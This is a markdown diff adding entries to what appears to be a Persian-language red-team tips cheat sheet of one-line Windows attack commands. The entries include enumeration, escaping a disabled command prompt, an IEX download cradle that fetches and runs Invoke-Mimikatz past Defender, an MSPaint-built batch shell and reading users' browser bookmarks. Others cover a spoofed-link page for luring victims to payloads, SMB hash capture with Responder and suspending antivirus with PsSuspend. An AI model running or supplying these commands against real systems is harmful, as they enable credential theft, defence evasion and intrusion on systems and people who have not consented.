@@ -325,3 +325,148 @@ type "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmark
 **اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)<br>
 **لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1595488676389171200)<br>
 
+### [🔙](#tool-list)Query DNS records for enumeration  
+*درخواست رکوردهای DNS برای شمارش*<br>  
+
+```bash
+Get-DnsRecord -RecordType A -ZoneName FQDN -Server <server hostname>
+```  
+
+**توضیح:** *'شمارش ۹۵٪ بازی است. با این حال، اجرای حجم زیادی از اسکن‌ها برای ارزیابی محیط، بسیار پرسر و صدا است. چرا فقط از سرور DC/DNS نخواهیم که تمام رکوردهای DNS را در اختیارمان بگذارد؟'*<br>  
+**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)<br>  
+**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1587132627823181824)<br>
+
+### [🔙](#tool-list)Unquoted service paths without PowerUp  
+*یافتن مسیرهای سرویس بدون کوتیشن (Unquoted) بدون استفاده از PowerUp*<br>  
+
+```bash
+Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+```  
+
+**توضیح:** *'یافتن مسیرهای سرویس بدون کوتیشن (Unquoted) بدون استفاده از PowerUp'* <br> 
+**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)  <br>
+**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1579254955554136064) <br> 
+
+### [🔙](#tool-list)Bypass a disabled command prompt with /k  
+*دور زدن خط فرمان غیرفعال شده با استفاده از /k*  <br>
+
+```bash
+# Win+R (برای باز کردن کادر Run)
+cmd.exe /k "whoami"
+```  
+
+**توضیح:** *'این خط فرمان توسط مدیر سیستم شما غیرفعال شده است...' این پیام معمولاً در محیط‌هایی مانند کیوسک‌های عمومی دیده می‌شود. یک راه حل سریع و hacky، استفاده از سوئیچ /k از طریق کادر Run ویندوز است. این دستور، دستور شما را اجرا می‌کند و سپس پیام محدودیت را نشان می‌دهد و در نتیجه اجرای دستور را ممکن می‌سازد.*  <br>
+**اعتبار:** Martin Sohn Christensen  <br>
+**لینک:** [Blog](https://improsec.com/tech-blog/the-command-prompt-has-been-disabled-by-your-administrator-press-any-key-to-continue-or-use-these-weird-tricks-to-bypass-admins-will-hate-you)  <br>
+
+### [🔙](#tool-list)Stop windows defender deleting mimikatz.exe  
+*جلوگیری از حذف فایل mimikatz.exe توسط Windows Defender* <br>
+
+```bash
+(new-object net.webclient).downloadstring('https://raw.githubusercontent[.]com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')|IEX;inv
+```  
+
+**توضیح:** *'از پاک شدن mimikatz.exe توسط Windows Defender خسته شده‌اید؟ این روش را امتحان کنید.'*  <br>
+**اعتبار:** [@GuhnooPlusLinux](https://twitter.com/GuhnooPlusLinux)  <br>
+**لینک:** [Twitter](https://twitter.com/GuhnooPlusLinux/status/1605629049660809216)  <br>
+
+### [🔙](#tool-list)Looking for internal endpoints in browser bookmarks  
+*یافتن نقاط پایانی داخلی در بوکمارک مرورگر* <br>
+
+```bash
+type "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"
+```  
+
+**توضیح:** *'شاید باور نکنید ولی فقط از روی بوکمارک‌های مرورگر کاربر می‌توان نقاط پایانی داخلی و منابع حساس را شناسایی کرد.'*  <br>
+**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)  <br>
+**لینک:** [Twitter](https://twitter.com/Alh4zr3d/status/1595488676389171200)<br>
+
+### [🔙](#tool-list)Check if you are in a virtual machine
+*بررسی اینکه آیا در یک ماشین مجازی هستید یا خیر*
+
+```bash
+reg query HKLM\SYSTEM /s | findstr /S "VirtualBox VBOX VMWare"
+```
+
+**توضیح:** *'می‌خواهید بدانید که آیا در یک ماشین مجازی هستید؟ کلیدهای رجیستری را جستجو کنید و بفهمید!!! اگر نتیجه‌ای نمایش داده شد، یعنی شما در یک ماشین مجازی هستید.'*
+**اعتبار:** [@dmcxblue](https://twitter.com/dmcxblue)
+**لینک:** [Twitter](https://twitter.com/dmcxblue/status/1366779034672136194)
+
+### [🔙](#tool-list)Enumerate AppLocker rules
+*شمارش قوانین AppLocker*
+
+```
+(Get-AppLockerPolicy -Local).RuleCollections
+
+Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
+
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
+```
+
+**توضیح:** *'AppLocker می‌تواند دردسرساز باشد. برای درک میزان این دردسر، قوانین آن را شمارش کنید.'*
+**اعتبار:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)
+**لینک:** [Twitter](https://twitter.com/alh4zr3d/status/1614706476412698624)
+
+### [🔙](#tool-list)CMD shortcut with 6 pixels via mspaint
+*دسترسی به CMD با استفاده از یک فایل 6 پیکسلی در MSPaint*
+
+![image](https://user-images.githubusercontent.com/100603074/223849011-24db49d7-37b0-4dad-a7a6-db046f6cb7da.png)
+
+1. برنامه MSPaint.exe را باز کنید و اندازه بوم را روی عرض: 6 و ارتفاع: 1 پیکسل تنظیم کنید.
+2. برای راحت‌تر انجام دادن مراحل بعدی، زوم کنید.
+3. با استفاده از ابزار انتخاب رنگ، مقادیر پیکسل‌ها را به ترتیب از چپ به راست به صورت زیر تنظیم کنید:
+    - پیکسل اول: قرمز: 10, سبز: 0, آبی: 0
+    - پیکسل دوم: قرمز: 13, سبز: 10, آبی: 13
+    - پیکسل سوم: قرمز: 100, سبز: 109, آبی: 99
+    - پیکسل چهارم: قرمز: 120, سبز: 101, آبی: 46
+    - پیکسل پنجم: قرمز: 0, سبز: 0, آبی: 101
+    - پیکسل ششم: قرمز: 0, سبز: 0, آبی: 0
+4. فایل را با فرمت **24-bit Bitmap (*.bmp;*.dib)** ذخیره کنید.
+5. پسوند فایل را از bmp به bat تغییر دهید و آن را اجرا کنید.
+
+**توضیح:** *'یک روش غیرمعمول اما مؤثر برای به دست آوردن یک شل (دسترسی خط فرمان) با ایجاد یک میانبر به cmd.exe با کشیدن رنگ‌های خاص در Microsoft Paint. به دلیل الگوریتم رمزگذاری مورد استفاده برای نوشتن فایل‌های BMP، امکان تعیین داده‌های ASCII نوشته شده در یک فایل با انتخاب دقیق مقادیر RGB خاص وجود دارد.'*
+**اعتبار:** [PenTestPartners](https://www.pentestpartners.com/)
+**لینک:** [Blog](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/#gainingacommandshell)
+
+### [🔙](#tool-list)Link spoofing with PreventDefault JavaScript method
+*جعل لینک با استفاده از متد PreventDefault در جاوااسکریپت*
+
+![image](https://user-images.githubusercontent.com/100603074/223849419-c65fec83-ca1c-4a20-ac06-ec2de537a748.png)
+
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>PreventDefault Example</title>
+  </head>
+  <body>
+    <a href="https://google.com" onclick="event.preventDefault(); window.location.href = 'https://bing.com';">Go to Google</a>
+  </body>
+</html>
+```
+
+**توضیح:** *مشاهده شده که عوامل تهدید از این تکنیک برای فریب قربانیان جهت کلیک روی لینک‌های جعلی دانلود بدافزار در صفحه استفاده می‌کنند. با استفاده از متد `PreventDefault` در جاوااسکریپت، می‌توانید لینکی را جعل کنید که در هاور (hover) لینک معتبر `google.com` را نمایش می‌دهد، اما پس از کلیک، قربانی به لینک مخرب شما (`bing.com`) هدایت می‌شود. این روش برای وادار کردن قربانیان به دانلود payloadها از طریق یک سایت تحت کنترل عالی است.*
+**لینک:** [مستندات PreventDefault](https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault)
+
+### [🔙](#tool-list)Check SMB firewall rules with Responder
+*بررسی قوانین فایروال برای SMB با استفاده از Responder*
+
+![image](https://user-images.githubusercontent.com/100603074/229650380-b651cfc4-896f-4429-b7b4-54d1241a5b39.png)
+
+```powershell
+Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"
+```
+
+**توضیح:** *«هنگامی که یک ارزیابی نفوذ (Compromise Assessment) انجام می‌دهم، اغلب از مشتری می‌پرسم که آیا می‌توانم یک بررسی سریع نهایی انجام دهم: `Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"`. اگر Responder بتواند هش را捕获 (capture) کند، به این معنی است که فایروال اجازه اتصالات خروجی SMB را می‌دهد.»*
+**اعتبار:** [@malmoeb](https://twitter.com/malmoeb)
+**لینک:** [Twitter](https://twitter.com/malmoeb/status/1628272928855826433)
+
+### [🔙](#tool-list)Disable AV with SysInternals PsSuspend
+*غیرفعال کردن آنتی‌ویروس با استفاده از PsSuspend از SysInternals*
+
+![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/4519f5ad-c177-4550-b9af-238fa73ad66e)
+
+**توضیح:** *با استفاده از ابزار Microsoft Sysinternals به نام PsSuspend.exe می‌توان برخی از فایل‌های اجرایی سرویس آنتی‌ویروس را به حالت تعلیق (suspend) درآورد. این ابزار امضا شده توسط مایکروسافت می‌تواند PID یا نام یک سرویس در حال اجرا را دریافت کند و آن فرآیند را از طریق Windows API به نام `NtSuspendProcess` متوقف کند.*
+**پست وبلاگ مرتبط:** [دور زدن آنتی‌ویروس از طریق تعلیق فرآیند با PsSuspend.exe](https://medium.com/@a-poc/process-suspension-with-pssuspend-exe-0cdf5d16a3b7)
+**لینک:** [Twitter](https://twitter.com/0gtweet/status/1638069413717975046)
